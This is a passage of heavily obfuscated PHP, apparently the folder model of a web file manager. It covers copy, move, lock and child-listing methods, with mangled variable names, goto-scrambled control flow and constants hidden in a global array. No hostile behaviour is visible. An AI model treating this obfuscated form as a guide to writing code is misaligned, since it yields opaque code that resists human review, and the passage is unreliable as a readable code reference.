»¼[95] . $EÃÓ§¡ª¤‹; CacheLock::setErrorMsg($EÔäßÎ »¼[374]); goto A­ƒµÂ‘£; a¿í‘îÚÁ: } private function _lockParent($A‡ å‹Ù‰¯, $fã—ÌŒ¦Ì, $D–õÍâ‹Ö×) { if (!$this->autoLockSet) { return; } $cŠÔ½°ÊÌ˜ = $this->sourceInfo($A‡ å‹Ù‰¯); if (!is_array($cŠÔ½°ÊÌ˜)) { return; } $a¿çä¥ïéÜ = array_reverse($this->parentLevelArray($cŠÔ½°ÊÌ˜[$_SERVER[¬ı§†‰ú˜¼][485]])); foreach ($a¿çä¥ïéÜ as $e¼ÙÎË™Ã£) { $this->_lockEvent($e¼ÙÎË™Ã£, $fã—ÌŒ¦Ì, $D–õÍâ‹Ö×); } } private function _lockEvent($Bâº‹›¨ğÖ, $d¨˜ÕöŸ‘³, $D‰Œí‰ö“­) { $F’°åƒ¼÷— =& $_SERVER[¬ı§†‰ú˜¼]; if (!$this->autoLockSet) { return; } foreach ($d¨˜ÕöŸ‘³ as $BÊíöÀİ–Š) { $DŠÏË­’Í = $BÊíöÀİ–Š . $F’°åƒ¼÷—[95] . $Bâº‹›¨ğÖ; if ($D‰Œí‰ö“­ && CacheLock::lockGet($F’°åƒ¼÷—[527] . $DŠÏË­’Í)) { continue; } $this->_lockKey($DŠÏË­’Í, $D‰Œí‰ö“­); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($f—êìôÔŒÛ, $FàíÌÅø· = 1) { $f§½øí•Šˆ = $_SERVER[¬ı§†‰ú˜¼][527] . md5($f—êìôÔŒÛ); if ($FàíÌÅø·) { if (isset(self::$_lockItemArr[$f§½øí•Šˆ])) { return; } self::$_lockItemArr[$f§½øí•Šˆ] = 1; CacheLock::lock($f§½øí•Šˆ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$f§½øí•Šˆ])) { return; } unset(self::$_lockItemArr[$f§½øí•Šˆ]); CacheLock::unlock($f§½øí•Šˆ); } } public function isParentOf($Aã¯ÓÔƒ­, $FÌª¦¥Á¿’) { goto aŞØÄ‘ÓˆŠ; a©é¹£éĞ: return $bŞ–¸Ú…º¾; goto a£†­ò’”“; AßŞŠá Å‚: $B««¡Ïñæ = $dì÷¹Œ×¨¢[$fÓÚÌÇî‚[485]] . $dì÷¹Œ×¨¢[$fÓÚÌÇî‚[394]] . $fÓÚÌÇî‚[47]; $Eô‡İ–Óõª = $C¹ÈÆÌÒßÂ[$fÓÚÌÇî‚[485]] . $C¹ÈÆÌÒßÂ[$fÓÚÌÇî‚[394]] . $fÓÚÌÇî‚[47]; $bŞ–¸Ú…º¾ = strpos($Eô‡İ–Óõª, $B««¡Ïñæ) === 0; goto a©é¹£éĞ; aŞØÄ‘ÓˆŠ: $fÓÚÌÇî‚ =& $_SERVER[¬ı§†‰ú˜¼]; $dì÷¹Œ×¨¢ = $this->sourceInfo($Aã¯ÓÔƒ­); $C¹ÈÆÌÒßÂ = $this->sourceInfo($FÌª¦¥Á¿’); goto AßŞŠá Å‚; a£†­ò’”“: } private $targetIsDelete = 0; public function copy($c½ä¡ÅÖ¤Š, $d©ÃĞŠ›Ò‘, $dä¡ÜŞ«ˆÙ = REPEAT_REPLACE, $a´Ÿ®øÌ = '') { goto e‡ÅÉÇä´ô; d©¬Áö£Ä: $this->_childrenListClear(); $this->lockCopyEnd($c½ä¡ÅÖ¤Š); $this->lockWriteEnd($d©ÃĞŠ›Ò‘, $bíÉğİ´ç); goto Bºê‰Ì¯±³; A¾š…ÂÆˆ­: if (!$dÎÜÄÃ¥† || !$DÂ¢îÁŒòÎ || $DÂ¢îÁŒòÎ[$CŸ©ùƒÁ¾[401]] != $CŸ©ùƒÁ¾[87]) { return !1; } if ($this->isParentOf($c½ä¡ÅÖ¤Š, $d©ÃĞŠ›Ò‘)) { return !1; } $bíÉğİ´ç = $a´Ÿ®øÌ ? $a´Ÿ®øÌ : $dÎÜÄÃ¥†[$CŸ©ùƒÁ¾[28]]; goto f¶Æ»©—Â; f¶Æ»©—Â: $this->lockCopyStart($c½ä¡ÅÖ¤Š); $this->lockWriteStart($d©ÃĞŠ›Ò‘, $bíÉğİ´ç); $C¨¡÷Å»• = array($CŸ©ùƒÁ¾[528] => array(), $CŸ©ùƒÁ¾[529] => array(), $CŸ©ùƒÁ¾[530] => array()); goto bÌ‰Ã°§„Ç; CÀÅ–±ŠÛ: $this->updateModifyTime($d©ÃĞŠ›Ò‘); return $c©åê­Š; goto Aóã¹¡ôé; bÌ‰Ã°§„Ç: $this->targetIsDelete = intval($dÎÜÄÃ¥†[$CŸ©ùƒÁ¾[421]]); $DáØõÒß¹‘ = $this->fileNameExistCache($d©ÃĞŠ›Ò‘, $dÎÜÄÃ¥†[$CŸ©ùƒÁ¾[28]]); $c©åê­Š = $this->_copy($c½ä¡ÅÖ¤Š, $d©ÃĞŠ›Ò‘, $dä¡ÜŞ«ˆÙ, $C¨¡÷Å»•, !0, $a´Ÿ®øÌ); goto d©¬Áö£Ä; B‘Øã°Õ¬Ñ: $this->saveAll($C¨¡÷Å»•[$CŸ©ùƒÁ¾[530]]); Model($CŸ©ùƒÁ¾[192])->linkAdd($C¨¡÷Å»•[$CŸ©ùƒÁ¾[528]]); $this->folderSizeReset($d©ÃĞŠ›Ò‘); goto CÀÅ–±ŠÛ; Bºê‰Ì¯±³: if ($dÎÜÄÃ¥†[$CŸ©ùƒÁ¾[401]] == $CŸ©ùƒÁ¾[87] && $DáØõÒß¹‘ == $c©åê­Š) { $this->folderSizeResetChildren($DáØõÒß¹‘); } Model($CŸ©ùƒÁ¾[531])->addAll($C¨¡÷Å»•[$CŸ©ùƒÁ¾[529]], array(), !0); if ($DáØõÒß¹‘ != $c©åê­Š || $dÎÜÄÃ¥†[$CŸ©ùƒÁ¾[401]] == $CŸ©ùƒÁ¾[87]) { Model($CŸ©ùƒÁ¾[532])->eventCopy($c©åê­Š); } goto B‘Øã°Õ¬Ñ; e‡ÅÉÇä´ô: $CŸ©ùƒÁ¾ =& $_SERVER[¬ı§†‰ú˜¼]; $dÎÜÄÃ¥† = $this->sourceInfo($c½ä¡ÅÖ¤Š); $DÂ¢îÁŒòÎ = $this->sourceInfo($d©ÃĞŠ›Ò‘); goto A¾š…ÂÆˆ­; Aóã¹¡ôé: } private function _copy($b‰æ³ßË×, $c‘á†íÂç, $f›¦È÷ğ¼», &$a³ç¦ƒÅ, $AÅùÜ¢¾œ, $cæÆ£°¹àí = '') { goto cê§Šğ›Ú–; cë‹ğÖìŒ: if (!$dŠÃÛæµ²ò) { return $this->_copyCreate($b‰æ³ßË×, $c‘á†íÂç, $Cí°Èù®Îƒ, $a³ç¦ƒÅ); } $eËğª¶Âğå = $dŠÃÛæµ²ò; if ($b‹©‹Ğô‚§) { if ($f›¦È÷ğ¼» == REPEAT_RENAME_FOLDER) { $Cí°Èù®Îƒ = $this->fileNameAutoCache($c‘á†íÂç, $Cí°Èù®Îƒ, $f›¦È÷ğ¼», $b‹©‹Ğô‚§); $eËğª¶Âğå = $this->_copyCreate($b‰æ³ßË×, $c‘á†íÂç, $Cí°Èù®Îƒ, $a³ç¦ƒÅ); } else { $e•‚äÚ¡ˆ = $this->_childrenList($b‰æ³ßË×); foreach ($e•‚äÚ¡ˆ as $a÷¤‹‡¢Îì) { $this->_copy($a÷¤‹‡¢Îì[$aè˜¥Ş¿Ë[394]], $dŠÃÛæµ²ò, $f›¦È÷ğ¼», $a³ç¦ƒÅ, !1); } } } else { if ($f›¦È÷ğ¼» == REPEAT_RENAME || $f›¦È÷ğ¼» == REPEAT_RENAME_FOLDER) { $Cí°Èù®Îƒ = $this->fileNameAutoCache($c‘á†íÂç, $Cí°Èù®Îƒ, $f›¦È÷ğ¼», $b‹©‹Ğô‚§); $eËğª¶Âğå = $this->_copyCreate($b‰æ³ßË×, $c‘á†íÂç, $Cí°Èù®Îƒ, $a³ç¦ƒÅ); } else { if ($f›¦È÷ğ¼» == REPEAT_REPLACE) { $eÒ§äè—Œ… = $this->sourceInfoCache($dŠÃÛæµ²ò); $DÜ¤ç“ê = $this->fileHistory($eÒ§äè—Œ…, $FåÄá¼¢[$aè˜¥Ş¿Ë[445]], $FåÄá¼¢[$aè˜¥Ş¿Ë[78]]); if ($DÜ¤ç“ê) { $a³ç¦ƒÅ[$aè˜¥Ş¿Ë[528]][] = $FåÄá¼¢[$aè˜¥Ş¿Ë[445]]; } } else { if ($f›¦È÷ğ¼» == REPEAT_SKIP) { } } } Hook::trigger($aè˜¥Ş¿Ë[533], array($aè˜¥Ş¿Ë[534], $FåÄá¼¢, 0)); } goto DŸ™¨­é†î; CÜˆõáğõ‚: $Cí°Èù®Îƒ = $cæÆ£°¹àí ? $cæÆ£°¹àí : $FåÄá¼¢[$aè˜¥Ş¿Ë[28]]; $dŠÃÛæµ²ò = $this->fileNameExistCache($c‘á†íÂç, $Cí°Èù®Îƒ); if ($AÅùÜ¢¾œ) { $this->_childrenAllMake($b‰æ³ßË×); if ($b‹©‹Ğô‚§ && $dŠÃÛæµ²ò) { $this->_childrenAllMake($dŠÃÛæµ²ò); } } goto cë‹ğÖìŒ; cê§Šğ›Ú–: $aè˜¥Ş¿Ë =& $_SERVER[¬ı§†‰ú˜¼]; $FåÄá¼¢ = $this->sourceInfoCache($b‰æ³ßË×); $b‹©‹Ğô‚§ = $FåÄá¼¢[$aè˜¥Ş¿Ë[401]] == $aè˜¥Ş¿Ë[87]; goto CÜˆõáğõ‚; DŸ™¨­é†î: return $eËğª¶Âğå; goto C“ÔÊ¹Í´·; C“ÔÊ¹Í´·: } private function _copyCreate($FƒöİŸŸñÔ, $b¥ÖíÍóæÎ, $f÷´ØòÃÁ, &$D‰”õâ‡ô÷) { goto D¡ÈÆ¢¡…°; DéÏ·÷éÃØ: foreach ($D’”¸ƒî as $b›ƒšÆÉª½) { $AÚåêÅì‰ = $b›ƒšÆÉª½[$eÓæ°óåÙâ[394]]; $b³¾¬ŸÈé£ = $this->_childrenMatch($cÚêØÎè¾¿, $b›ƒšÆÉª½, $e ³ñ†Ç†Ğ); $dí¹Ìôô’[] = array($eÓæ°óåÙâ[394], $AÚåêÅì‰, $eÓæ°óåÙâ[476], $b³¾¬ŸÈé£[$eÓæ°óåÙâ[476]]); $bÌÈø˜Ô•[] = array($eÓæ°óåÙâ[394], $AÚåêÅì‰, $eÓæ°óåÙâ[485], $b³¾¬ŸÈé£[$eÓæ°óåÙâ[485]]); $this->_copyApplyMeta($b›ƒšÆÉª½, $D‰”õâ‡ô÷); if ($b›ƒšÆÉª½[$eÓæ°óåÙâ[401]] != $eÓæ°óåÙâ[87]) { $D‰”õâ‡ô÷[$eÓæ°óåÙâ[528]][] = $b›ƒšÆÉª½[$eÓæ°óåÙâ[445]]; } } $this->chunkEventSet($eÓæ°óåÙâ[540], array($eÓæ°óåÙâ[541], $DÙñ²·ÑÖ, $E×—ä˜¥¾á)); $this->saveAll($dí¹Ìôô’); goto e¬©º“Éë¿; B©èëÓ¶‹à: $this->addAll($DÛ×Ğ™¦åƒ, array(), !1); $D’”¸ƒî = $this->where(array($eÓæ°óåÙâ[476] => $eĞ·¼³ªöî))->select(); $cÚêØÎè¾¿ = $this->_childrenMakeRelation($DÙ˜…Ÿ½Ÿ‰, $D’”¸ƒî); goto aÃ‰´»®ïï; E‡²ù”Ã˜: $e ³ñ†Ç†Ğ = $this->sourceInfo($eĞ·¼³ªöî); foreach ($DÙ˜…Ÿ½Ÿ‰ as $b›ƒšÆÉª½) { $c²£Ñó´Ü = $this->_makeItemData($b›ƒšÆÉª½, $e ³ñ†Ç†Ğ, $b›ƒšÆÉª½[$eÓæ°óåÙâ[28]]); $c²£Ñó´Ü[$eÓæ°óåÙâ[485]] = $b›ƒšÆÉª½[$eÓæ°óåÙâ[485]]; $DÛ×Ğ™¦åƒ[] = $c²£Ñó´Ü; } $this->chunkEventSet($eÓæ°óåÙâ[538], array($eÓæ°óåÙâ[539], $DÙñ²·ÑÖ, $E×—ä˜¥¾á)); goto B©èëÓ¶‹à; aÃ‰´»®ïï: $cÚêØÎè¾¿[$FƒöİŸŸñÔ] = $eĞ·¼³ªöî; $dí¹Ìôô’ = array(); $bÌÈø˜Ô• = array(); goto DéÏ·÷éÃØ; FËö­ Ä´: $this->_childrenListAll($FƒöİŸŸñÔ, $DÙ˜…Ÿ½Ÿ‰); $E×—ä˜¥¾á = count($DÙ˜…Ÿ½Ÿ‰); if ($E×—ä˜¥¾á == 0) { return $eĞ·¼³ªöî; } goto E‡²ù”Ã˜; DµÆÜ”®–ƒ: $eĞ·¼³ªöî = $this->add($DÙñ²·ÑÖ); $Bî¤ÎÈîÙí = array($eÓæ°óåÙâ[394] => $eĞ·¼³ªöî, $eÓæ°óåÙâ[28] => $f÷´ØòÃÁ); $this->_copyApplyMeta($Bî¤ÎÈîÙí, $D‰”õâ‡ô÷); goto B×³“åÇĞÀ; e¬©º“Éë¿: $this->chunkEventSet($eÓæ°óåÙâ[542], array($eÓæ°óåÙâ[543], $DÙñ²·ÑÖ, $E×—ä˜¥¾á)); $this->saveAll($bÌÈø˜Ô•); return $eĞ·¼³ªöî; goto f®‘òº²‘È; B×³“åÇĞÀ: if ($CÓÕáˆå[$eÓæ°óåÙâ[401]] != $eÓæ°óåÙâ[87]) { $D‰”õâ‡ô÷[$eÓæ°óåÙâ[528]][] = $CÓÕáˆå[$eÓæ°óåÙâ[445]]; return $eĞ·¼³ªöî; } $DÙ˜…Ÿ½Ÿ‰ = array(); $DÛ×Ğ™¦åƒ = array(); goto FËö­ Ä´; eÛ«Ìí£: $DÙñ²·ÑÖ = $this->_makeItemData($CÓÕáˆå, $bÅ†ï£õæ“, $f÷´ØòÃÁ); Hook::trigger($eÓæ°óåÙâ[535], $DÙñ²·ÑÖ); Hook::trigger($eÓæ°óåÙâ[536], array($eÓæ°óåÙâ[537], $DÙñ²·ÑÖ, 0)); goto DµÆÜ”®–ƒ; D¡ÈÆ¢¡…°: $eÓæ°óåÙâ =& $_SERVER[¬ı§†‰ú˜¼]; $CÓÕáˆå = $this->sourceInfoCache($FƒöİŸŸñÔ); $bÅ†ï£õæ“ = $this->sourceInfoCache($b¥ÖíÍóæÎ); goto eÛ«Ìí£; f®‘òº²‘È: } private function _childrenMakeRelation($AóÔ¥«â¡, $aˆ²¸íğóŒ) { $fÇäŒÂµ–ê =& $_SERVER[¬ı§†‰ú˜¼]; $b…ŒŠô×Õà = array(); $F‹ÇÜò –© = array(); foreach ($AóÔ¥«â¡ as $F–¥š»‹„) { $eƒ‡†ìÁÅÊ = $F–¥š»‹„[$fÇäŒÂµ–ê[28]] . $fÇäŒÂµ–ê[8] . $F–¥š»‹„[$fÇäŒÂµ–ê[485]]; $b…ŒŠô×Õà[$eƒ‡†ìÁÅÊ] = $F–¥š»‹„[$fÇäŒÂµ–ê[394]]; } foreach ($aˆ²¸íğóŒ as $F–¥š»‹„) { $eƒ‡†ìÁÅÊ = $F–¥š»‹„[$fÇäŒÂµ–ê[28]] . $fÇäŒÂµ–ê[8] . $F–¥š»‹„[$fÇäŒÂµ–ê[485]]; $e´õ‰¼Ö• = $b…ŒŠô×Õà[$eƒ‡†ìÁÅÊ]; $F‹ÇÜò –©[$e´õ‰¼Ö•] = $F–¥š»‹„[$fÇäŒÂµ–ê[394]]; } return $F‹ÇÜò –©; } private function _childrenMatch($c•‡“»Ó«Ù, $BÌ‘ëæ®£Ù, $EäôÔÖĞ›¢) { goto EŒ¹Ò‡Å¤½; EŒ¹Ò‡Å¤½: $DÆ”“äÈè£ =& $_SERVER[¬ı§†‰ú˜¼]; $Eİ¤¿áºßÅ = $EäôÔÖĞ›¢[$DÆ”“äÈè£[485]]; $aáµö²¬‚ë = $this->parentLevelArray($BÌ‘ëæ®£Ù[$DÆ”“äÈè£[485]]); goto c‹‘ªîÀ—; c‹‘ªîÀ—: foreach ($aáµö²¬‚ë as $f¨ÔäÕçá) { if (isset($c•‡“»Ó«Ù[$f¨ÔäÕçá])) { $Eİ¤¿áºßÅ .= $c•‡“»Ó«Ù[$f¨ÔäÕçá] . $DÆ”“äÈè£[544]; } } $Eİ¤¿áºßÅ = rtrim($Eİ¤¿áºßÅ, $DÆ”“äÈè£[47]) . $DÆ”“äÈè£[47]; $fÕôŒŠìÄŸ = $this->parentLevelArray($Eİ¤¿áºßÅ); goto CÒƒÒ†°·¸; CÒƒÒ†°·¸: $aã†‚—íö¥ = $fÕôŒŠìÄŸ[count($fÕôŒŠìÄŸ) - 1]; return array($DÆ”“äÈè£[476] => $aã†‚—íö¥, $DÆ”“äÈè£[485] => $Eİ¤¿áºßÅ); goto e¡ëËî‚¸µ; e¡ëËî‚¸µ: } private function _makeItemData($B‚ôÌá¶Ò, $cõÃÃãµÊ…, $E™äÇ¤Éƒ¼) { $EÜêÈ—ˆõ =& $_SERVER[¬ı§†‰ú˜¼]; $c¸¯Şõ‘÷É = array($EÜêÈ—ˆõ[545] => $B‚ôÌá¶Ò[$EÜêÈ—ˆõ[401]], $EÜêÈ—ˆõ[411] => $E™äÇ¤Éƒ¼, $EÜêÈ—ˆõ[546] => $B‚ôÌá¶Ò[$EÜêÈ—ˆõ[403]], $EÜêÈ—ˆõ[446] => $B‚ôÌá¶Ò[$EÜêÈ—ˆõ[445]], $EÜêÈ—ˆõ[547] => $B‚ôÌá¶Ò[$EÜêÈ—ˆõ[78]], $EÜêÈ—ˆõ[548] => $cõÃÃãµÊ…[$EÜêÈ—ˆõ[402]], $EÜêÈ—ˆõ[549] => $cõÃÃãµÊ…[$EÜêÈ—ˆõ[482]], $EÜêÈ—ˆõ[550] => USER_ID, $EÜêÈ—ˆõ[551] => USER_ID, $EÜêÈ—ˆõ[393] => $cõÃÃãµÊ…[$EÜêÈ—ˆõ[394]], $EÜêÈ—ˆõ[552] => $cõÃÃãµÊ…[$EÜêÈ—ˆõ[485]] . $cõÃÃãµÊ…[$EÜêÈ—ˆõ[394]] . $EÜêÈ—ˆõ[47], $EÜêÈ—ˆõ[415] => $B‚ôÌá¶Ò[$EÜêÈ—ˆõ[84]], $EÜêÈ—ˆõ[420] => 0, $EÜêÈ—ˆõ[553] => $EÜêÈ—ˆõ[33]); return $c¸¯Şõ‘÷É; } private function _copyApplyMeta($dï’ã³–Œ, &$D»‡¢ò¥»ß) { $D—®èÇ‡Ëµ =& $_SERVER[¬ı§†‰ú˜¼]; $AÅÕ»¬…ˆ = $dï’ã³–Œ[$D—®èÇ‡Ëµ[394]]; $b®âòÉò¬ó = $dï’ã³–Œ[$D—®èÇ‡Ëµ[28]]; if (!isset($dï’ã³–Œ[$D—®èÇ‡Ëµ[554]]) || !$dï’ã³–Œ[$D—®èÇ‡Ëµ[554]] || $dï’ã³–Œ[$D—®èÇ‡Ëµ[554]] == $D—®èÇ‡Ëµ[495]) { $D»‡¢ò¥»ß[$D—®èÇ‡Ëµ[530]][] = array($D—®èÇ‡Ëµ[394], $AÅÕ»¬…ˆ, $D—®èÇ‡Ëµ[554], short_id($AÅÕ»¬…ˆ)); } if (Input::check($b®âòÉò¬ó, $D—®èÇ‡Ëµ[555])) { $D»‡¢ò¥»ß[$D—®èÇ‡Ëµ[529]][] = array($D—®èÇ‡Ëµ[394] => $AÅÕ»¬…ˆ, $D—®èÇ‡Ëµ[93] => $D—®èÇ‡Ëµ[442], $D—®èÇ‡Ëµ[371] => str_replace($D—®èÇ‡Ëµ[50], $D—®èÇ‡Ëµ[33], Pinyin::encode($b®âòÉò¬ó))); $D»‡¢ò¥»ß[$D—®èÇ‡Ëµ[529]][] = array($D—®èÇ‡Ëµ[394] => $AÅÕ»¬…ˆ, $D—®èÇ‡Ëµ[93] => $D—®èÇ‡Ëµ[441], $D—®èÇ‡Ëµ[371] => Pinyin::encode($b®âòÉò¬ó, $D—®èÇ‡Ëµ[556])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($b±½„íÖ¾) { goto F½åÍ¾‹Ôó; bØçœ¾«šˆ: $F´¿Ò•é– = array_to_keyvalue($F´¿Ò•é–, $f‰Ñ˜‹²Â[394]); foreach ($F´¿Ò•é– as $e…ŸÍÊ¯) { $B°Ñß­·Ú = $e…ŸÍÊ¯[$f‰Ñ˜‹²Â[476]]; $b±½„íÖ¾ = $e…ŸÍÊ¯[$f‰Ñ˜‹²Â[394]]; if (!isset($this->_childrenListCache[$b±½„íÖ¾]) && $e…ŸÍÊ¯[$f‰Ñ˜‹²Â[401]] == $f‰Ñ˜‹²Â[87]) { $this->_childrenListCache[$b±½„íÖ¾] = array(); } if (!isset($this->_childrenListCache[$B°Ñß­·Ú])) { $this->_childrenListCache[$B°Ñß­·Ú] = array(); } $this->_childrenListCache[$B°Ñß­·Ú][$b±½„íÖ¾] = $e…ŸÍÊ¯; $this->_childrenItemCache[$b±½„íÖ¾] = $e…ŸÍÊ¯; } goto FöÎø‡³êŸ; F½åÍ¾‹Ôó: $f‰Ñ˜‹²Â =& $_SERVER[¬ı§†‰ú˜¼]; $C¶à½ÙÖëÀ = $this->sourceInfo($b±½„íÖ¾); $c‚˜Ğ„À´Ö = $f‰Ñ˜‹²Â[422]; goto fæÌˆùõÈä; fæÌˆùõÈä: $A«ÊåîŞ¨— = array($f‰Ñ˜‹²Â[485] => array($f‰Ñ˜‹²Â[511], $C¶à½ÙÖëÀ[$f‰Ñ˜‹²Â[485]] . $b±½„íÖ¾ . $f‰Ñ˜‹²Â[512]), $f‰Ñ˜‹²Â[421] => $this->targetIsDelete); $F´¿Ò•é– = $this->field($c‚˜Ğ„À´Ö)->where($A«ÊåîŞ¨—)->select(); if (!$F´¿Ò•é–) { return; } goto bØçœ¾«šˆ; FöÎø‡³êŸ: } private function _childrenListAll($eÑØ•«÷¬‚, &$fõ¯†³ É¶) { $Bğí‘Ÿè“ =& $_SERVER[¬ı§†‰ú˜¼]; if (!isset($this->_childrenListCache[$eÑØ•«÷¬‚])) { return; } $A‡âÅ“ñÂ™ = $this->_childrenListCache[$eÑØ•«÷¬‚]; foreach ($A‡âÅ“ñÂ™ as $cÕ¯®šäö => $fƒÎ¥Ó‡¦¥) { $fõ¯†³ É¶[$cÕ¯®šäö] = $fƒÎ¥Ó‡¦¥; if ($fƒÎ¥Ó‡¦¥[$Bğí‘Ÿè“[401]] == $Bğí‘Ÿè“[87]) { $this->_childrenListAll($cÕ¯®šäö, $fõ¯†³ É¶); } } } private function sourceInfoCache($E×Øğ‰æ¹æ) { if (isset($this->_childrenItemCache[$E×Øğ‰æ¹æ])) { return $this->_childrenItemCache[$E×Øğ‰æ¹æ]; } return $this->sourceInfo($E×Øğ‰æ¹æ); } private function _childrenList($fà· ÛÎÑ) { if (isset($this->_childrenListCache[$fà· ÛÎÑ])) { return $this->_childrenListCache[$fà· ÛÎÑ]; } return $this->_childrenListSelect($fà· ÛÎÑ); } private function _childrenListSelect($A„àŠµÇÉ’) { goto aã–İÙ––†; Bš«ƒ»›ˆ: $eĞçŒ µéÄ = $eĞçŒ µéÄ ? $eĞçŒ µéÄ : array(); $BàÒç—Ì•Ó = array_to_keyvalue($eĞçŒ µéÄ, $a£óÕãÉĞ˜[394]); $this->_childrenListCache[$A„àŠµÇÉ’] = $BàÒç—Ì•Ó; goto Bì¬ÜŠˆ; aã–İÙ––†: $a£óÕãÉĞ˜ =& $_SERVER[¬ı§†‰ú˜¼]; $fê‚£·š = array($a£óÕãÉĞ˜[476] => $A„àŠµÇÉ’, $a£óÕãÉĞ˜[421] => $this->targetIsDelete); $eĞçŒ µéÄ = $this->where($fê‚£·š)->select(); goto Bš«ƒ»›ˆ; Bì¬ÜŠˆ: foreach ($BàÒç—Ì•Ó as $A„àŠµÇÉ’ => $fˆåªõ˜ë) { $this->_childrenItemCache[$A„àŠµÇÉ’] = $fˆåªõ˜ë; } return $BàÒç—Ì•Ó; goto BÌ¹ï÷‘›ô; BÌ¹ï÷‘›ô: } private function fileNameExistCache($a–¸•¥Ã­, $Fç—ã¼‹´) { $fêÅßÏè…Ø =& $_SERVER[¬ı§†‰ú˜¼]; $Fç—ã¼‹´ = strtolower($Fç—ã¼‹´); $C¦İÉØÛ ì = $this->_childrenList($a–¸•¥Ã­); foreach ($C¦İÉØÛ ì as $Eï…ö›åèÇ) { if ($Fç—ã¼‹´ == strtolower($Eï…ö›åèÇ[$fêÅßÏè…Ø[28]])) { return $Eï…ö›åèÇ[$fêÅßÏè…Ø[394]]; } } return !1; } private function fileNameAutoCache($fó•ƒÚÀø¢, $cğÓ´²±Í°, $D—„Ã§Í‹», $aÚÂŞ Ç…) { $F¡©ÒÖŒšî =& $_SERVER[¬ı§†‰ú˜¼]; $A•äãïéæê = $this->_childrenList($fó•ƒÚÀø¢); $dˆíº…½ = array_to_keyvalue($A•äãïéæê, $F¡©ÒÖŒšî[33], $F¡©ÒÖŒšî[28]); return $this->fileNameAutoGet($dˆíº…½, $cğÓ´²±Í°, $D—„Ã§Í‹», $aÚÂŞ Ç…); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($dç‘‘Ë¹ƒ‚, $A¬éŸ¹¶µ÷, $bŒ™©¡®¹ = REPEAT_REPLACE, $Fò†Ê‹ã‰Ê = '') { goto bë„¬°ï¶; C‘Ó»†é: if ($E‘¯ã¡»‰ï[$e„ø™¯[401]] == $e„ø™¯[87] && $E†ì®ÖÈ) { $this->folderSizeResetChildren($b£ëÛìª­å); } Model($e„ø™¯[192])->linkAdd($bÖéì”ÎÔ—[$e„ø™¯[528]]); if ($E†ì®ÖÈ && $bÖéì”ÎÔ—[$e„ø™¯[559]]) { $this->removeNow($dç‘‘Ë¹ƒ‚, !1); } goto f÷¨Õ­ùˆÀ; c¿Œ½—Ôš: if ($E‘¯ã¡»‰ï[$e„ø™¯[476]] == $E‹ÁÏğ„ï[$e„ø™¯[394]]) { if ($E‘¯ã¡»‰ï[$e„ø™¯[421]] == $e„ø™¯[87]) { Model($e„ø™¯[419])->restore(array($dç‘‘Ë¹ƒ‚)); } if (!$Fò†Ê‹ã‰Ê || $Fò†Ê‹ã‰Ê == $E‘¯ã¡»‰ï[$e„ø™¯[28]]) { return $dç‘‘Ë¹ƒ‚; } } $d·Ñ‹ÑÀ¦ = $this->pathInfoMore($dç‘‘Ë¹ƒ‚); if ($this->isParentOf($dç‘‘Ë¹ƒ‚, $A¬éŸ¹¶µ÷)) { return !1; } goto d©ŸÆ‘Áõ; Aô£µÔï²ù: return $b£ëÛìª­å; goto fˆ»Áì§ª´; dš²¡ã²‘í: $E†ì®ÖÈ = $this->fileNameExistCache($A¬éŸ¹¶µ÷, $E‘¯ã¡»‰ï[$e„ø™¯[28]]); $b£ëÛìª­å = $this->_move($dç‘‘Ë¹ƒ‚, $A¬éŸ¹¶µ÷, $bŒ™©¡®¹, $bÖéì”ÎÔ—, $Fò†Ê‹ã‰Ê); $this->sourceCacheClear(); goto C‘Ó»†é; Eíİ–ä½¼“: $this->folderSizeReset($A¬éŸ¹¶µ÷); $DÔˆÒëÕó© = array($E‘¯ã¡»‰ï[$e„ø™¯[476]], $A¬éŸ¹¶µ÷); if ($E‘¯ã¡»‰ï[$e„ø™¯[401]] == $e„ø™¯[87]) { $DÔˆÒëÕó©[] = $dç‘‘Ë¹ƒ‚; } goto e±Œ‹Å†ó¬; bë„¬°ï¶: $e„ø™¯ =& $_SERVER[¬ı§†‰ú˜¼]; $E‘¯ã¡»‰ï = $this->sourceInfo($dç‘‘Ë¹ƒ‚); $E‹ÁÏğ„ï = $this->sourceInfo($A¬éŸ¹¶µ÷); goto c¿Œ½—Ôš; f‡ˆ¶‡±’Í: $this->lockWriteStart($A¬éŸ¹¶µ÷, $Cõê¶¸’¿É); $bÖéì”ÎÔ— = array($e„ø™¯[528] => array(), $e„ø™¯[559] => !1); $this->clearShare($dç‘‘Ë¹ƒ‚, $A¬éŸ¹¶µ÷); goto dš²¡ã²‘í; BŒ±Ïë£ì: if ($E‘¯ã¡»‰ï[$e„ø™¯[476]] == $A¬éŸ¹¶µ÷ && $Fò†Ê‹ã‰Ê != $E‘¯ã¡»‰ï[$e„ø™¯[28]]) { $BÇ‘Æ«²•“ = $this->fileNameExist($A¬éŸ¹¶µ÷, $Fò†Ê‹ã‰Ê); if ($BÇ‘Æ«²•“ && $E‘¯ã¡»‰ï[$e„ø™¯[401]] == $e„ø™¯[495]) { goto DÛùŒÍÅ•; f­†Ş ˆ’: return $BÇ‘Æ«²•“; goto a¡…ƒ‹ù”; BÙ½ñç†ÂÍ: $this->removeNow($dç‘‘Ë¹ƒ‚, !1); $this->folderSizeReset($A¬éŸ¹¶µ÷); Hook::trigger($e„ø™¯[558], $d·Ñ‹ÑÀ¦); goto f­†Ş ˆ’; DÛùŒÍÅ•: $A¿Ï ìªé§ = $this->sourceInfo($BÇ‘Æ«²•“); $B×ÕÍ˜Ù¸¦ = $this->fileHistory($A¿Ï ìªé§, $E‘¯ã¡»‰ï[$e„ø™¯[445]], $E‘¯ã¡»‰ï[$e„ø™¯[78]]); if (!$B×ÕÍ˜Ù¸¦) { Model($e„ø™¯[448])->remove($E‘¯ã¡»‰ï[$e„ø™¯[445]]); } goto BÙ½ñç†ÂÍ; a¡…ƒ‹ù”: } } $Cõê¶¸’¿É = $Fò†Ê‹ã‰Ê ? $Fò†Ê‹ã‰Ê : $E‘¯ã¡»‰ï[$e„ø™¯[28]]; $this->lockMoveStart($dç‘‘Ë¹ƒ‚); goto f‡ˆ¶‡±’Í; d©ŸÆ‘Áõ: if (!$E‘¯ã¡»‰ï || !$E‹ÁÏğ„ï || $E‹ÁÏğ„ï[$e„ø™¯[401]] != 